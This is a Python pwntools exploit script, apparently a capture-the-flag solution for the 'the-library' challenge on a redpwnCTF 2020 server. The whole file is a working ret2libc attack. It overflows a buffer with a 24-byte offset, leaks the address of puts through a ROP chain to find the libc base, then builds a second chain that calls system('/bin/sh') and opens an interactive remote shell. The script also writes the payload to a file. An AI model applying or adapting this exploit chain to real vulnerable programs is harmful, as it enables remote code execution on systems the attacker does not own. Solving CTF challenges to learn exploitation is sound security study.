#Authors: Lumpus
from pwn import *
import pdb
import itertools

elf = ELF('the-library')
p = remote('2020.redpwnc.tf', 31350)
# p = process('./the-library')
# p = gdb.debug('./main','b main')
# p = gdb.debug('./the-library', 'b main')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc.so.6')

OFFSET = 24

a = p.recvuntil('your name?')
puts_plt = elf.plt['puts']
main_plt = elf.symbols['main']
pop_rdi_ret = 0x0000000000400733
ret = 0x0000000000400506

# Leak libc address
puts_got = elf.got['puts']
log.info('puts GOT: ' + str(hex(puts_got)))

payload = b'A'*OFFSET
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_plt)

# Need this to clean the pipe
p.clean()
p.sendline(payload)
a = p.recvuntil('Hello there:')
a = p.recvline()
a = p.recvline()
a = p.recvline().strip()
leak = u64(a.ljust(8, b"\x00"))
log.info(hex(leak))

# recieved = p.recvline().strip()
# recieved = p.recvline().strip()
# log.info('Received: ' + str(int(recieved)))

# log.info('Leaked puts address in memory: ' + str(hex(leak)))

# Calculate libc base address
libc.address = leak - libc.symbols['puts']
log.info('Leaked libc address: ' + str(hex(libc.address)))

# Obtain the address of system
system = libc.symbols['system']

# Find /bin/sh string in libc

bin_sh = next(libc.search(b'/bin/sh'))


# Print address of system
log.info('Address of system: ' + str(hex(system)))

# Print address of /bin/sh
log.info('Address of /bin/sh: ' + str(hex(bin_sh)))

# Pop a shell
payload = b'A'*OFFSET
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

# Write exploit to pwn file
f = open('pwn','wb')
f.write(payload)
f.close()

p.sendline(payload)
p.interactive()
